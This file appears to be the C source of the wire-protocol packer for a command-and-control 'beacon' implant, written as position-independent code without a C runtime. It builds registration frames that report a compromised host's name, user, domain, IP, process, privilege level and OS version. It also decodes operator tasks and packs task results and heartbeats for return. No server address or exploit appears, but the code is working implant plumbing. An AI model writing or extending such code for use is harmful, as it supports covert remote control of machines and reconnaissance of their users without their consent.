/* beacon/src/Core/Packer.c
 * Wire-v0 frame encode / decode.  PIC port of agent/src/packer.c.
 * No CRT: uses MmCopy(__builtin_memcpy). Callers supply string lengths. */

#include "Macros.h"
#include "Wire.h"
#include "Instance.h"

/* ========= [ LE write helpers ] ========= */

FUNC VOID NaxW16( PBYTE p, UINT16 v ) {
    p[0] = (BYTE)( v & 0xFFu );
    p[1] = (BYTE)( ( v >> 8 ) & 0xFFu );
}

FUNC VOID NaxW32( PBYTE p, UINT32 v ) {
    p[0] = (BYTE)( v & 0xFFu );
    p[1] = (BYTE)( ( v >> 8 ) & 0xFFu );
    p[2] = (BYTE)( ( v >> 16 ) & 0xFFu );
    p[3] = (BYTE)( ( v >> 24 ) & 0xFFu );
}

FUNC UINT16 NaxR16( const PBYTE p ) {
    return (UINT16)p[0] | ( (UINT16)p[1] << 8 );
}

FUNC UINT32 NaxR32( const PBYTE p ) {
    return (UINT32)p[0] | ( (UINT32)p[1] << 8 ) | ( (UINT32)p[2] << 16 ) | ( (UINT32)p[3] << 24 );
}

/* ========= [ frame encode ] ========= */

FUNC INT NaxFrameEncode( BYTE        msg_type,
                         const PBYTE body, UINT32 body_len,
                         PBYTE out, UINT32* out_len ) {
    if ( *out_len < NAX_FRAME_HDR + body_len )
        return NAX_ERR_NOMEM;

    out[0] = msg_type;
    out[1] = 0;
    NaxW32( out + 2, body_len );
    if ( body_len > 0 && body != NULL )
        MmCopy( out + NAX_FRAME_HDR, body, body_len );
    *out_len = NAX_FRAME_HDR + body_len;
    return NAX_OK;
}

/* ========= [ frame decode ] ========= */

FUNC INT NaxFrameDecode( const PBYTE frame, UINT32 frame_len,
                         BYTE* msg_type, PBYTE* body,
                         UINT32* body_len ) {
    if ( frame_len < NAX_FRAME_HDR )
        return NAX_ERR_WIRE;
    UINT32 bl = NaxR32( frame + 2 );
    if ( NAX_FRAME_HDR + bl > frame_len )
        return NAX_ERR_WIRE;
    if ( msg_type )
        *msg_type = frame[0];
    if ( body )
        *body = (PBYTE)frame + NAX_FRAME_HDR;
    if ( body_len )
        *body_len = bl;
    return NAX_OK;
}

/* ========= [ REGISTER body ] ========= */

/* Builds REGISTER body (no outer frame header).
 * hn/un/ip/dom/proc are UTF-8 strings with explicit lengths. */
FUNC INT NaxBuildRegBody( const PCHAR hn,   UINT32 hn_len,
                          const PCHAR un,   UINT32 un_len,
                          BYTE        arch,
                          UINT32      pid,
                          UINT32      sleep_ms,
                          UINT32      tid,
                          const PCHAR ip,   UINT32 ip_len,
                          const PCHAR dom,  UINT32 dom_len,
                          const PCHAR proc, UINT32 proc_len,
                          BYTE        elevated,
                          UINT32      os_major,
                          UINT32      os_minor,
                          UINT16      os_build,
                          UINT32      parent_pid,
                          UINT32      acp,
                          UINT32      oem_cp,
                          const PCHAR img,  UINT32 img_len,
                          PBYTE out, UINT32* out_len ) {
    UINT32 needed = 2 + hn_len + 2 + un_len + 1 + 4 + 4 + 4 +
                    2 + ip_len + 2 + dom_len + 2 + proc_len +
                    1 + 4 + 4 + 2 + 4 + 4 + 4 + 2 + img_len;
    if ( *out_len < needed ) return NAX_ERR_NOMEM;

    PBYTE p = out;
    NaxW16( p, (UINT16)hn_len );   p += 2; MmCopy( p, hn, hn_len );   p += hn_len;
    NaxW16( p, (UINT16)un_len );   p += 2; MmCopy( p, un, un_len );   p += un_len;
    *p++ = arch;
    NaxW32( p, pid );              p += 4;
    NaxW32( p, sleep_ms );         p += 4;
    NaxW32( p, tid );              p += 4;
    NaxW16( p, (UINT16)ip_len );   p += 2; MmCopy( p, ip, ip_len );   p += ip_len;
    NaxW16( p, (UINT16)dom_len );  p += 2; MmCopy( p, dom, dom_len ); p += dom_len;
    NaxW16( p, (UINT16)proc_len ); p += 2;
    if ( proc_len > 0 ) MmCopy( p, proc, proc_len );
    p += proc_len;
    *p++ = elevated;
    NaxW32( p, os_major );         p += 4;
    NaxW32( p, os_minor );         p += 4;
    NaxW16( p, os_build );         p += 2;
    NaxW32( p, parent_pid );       p += 4;
    NaxW32( p, acp );              p += 4;
    NaxW32( p, oem_cp );           p += 4;
    NaxW16( p, (UINT16)img_len );  p += 2;
    if ( img_len > 0 ) MmCopy( p, img, img_len );
    p += img_len;

    *out_len = needed;
    return NAX_OK;
}

/* ========= [ HEARTBEAT frame ] ========= */

FUNC INT NaxBuildHeartbeat( PBYTE out, UINT32* out_len ) {
    return NaxFrameEncode( NAX_WIRE_HEARTBEAT, NULL, 0, out, out_len );
}

/* ========= [ TASK body decode ] ========= */

FUNC INT NaxDecodeTask( const PBYTE body, UINT32 body_len, NAX_TASK* t ) {
    /* TASK body: task_id(4) + cmd_id(1) + args_len(4) + args(n) = min 9 */
    if ( body_len < 9 )
        return NAX_ERR_WIRE;
    t->TaskId  = NaxR32( body );
    t->CmdId   = body[4];
    t->ArgsLen = NaxR32( body + 5 );
    if ( 9u + t->ArgsLen > body_len )
        return NAX_ERR_WIRE;
    t->Args = ( t->ArgsLen > 0 ) ? (PBYTE)body + 9 : NULL;
    return NAX_OK;
}

/* ========= [ RESULT frame ] ========= */

FUNC INT NaxBuildResult( UINT32      task_id,
                         BYTE        status,
                         const PBYTE data, UINT32 data_len,
                         PBYTE out, UINT32* out_len ) {
    if ( data_len > 0 && data == NULL )
        return NAX_ERR_INVAL;
    UINT32 body_len = 4 + 1 + 4 + data_len;
    UINT32 needed = NAX_FRAME_HDR + body_len;
    if ( *out_len < needed )
        return NAX_ERR_NOMEM;

    out[0] = NAX_WIRE_RESULT;
    out[1] = 0;
    NaxW32( out + 2, body_len );

    PBYTE p = out + NAX_FRAME_HDR;
    NaxW32( p, task_id );
    p += 4;
    *p++ = status;
    NaxW32( p, data_len );
    p += 4;
    if ( data_len > 0 )
        MmCopy( p, data, data_len );

    *out_len = needed;
    return NAX_OK;
}

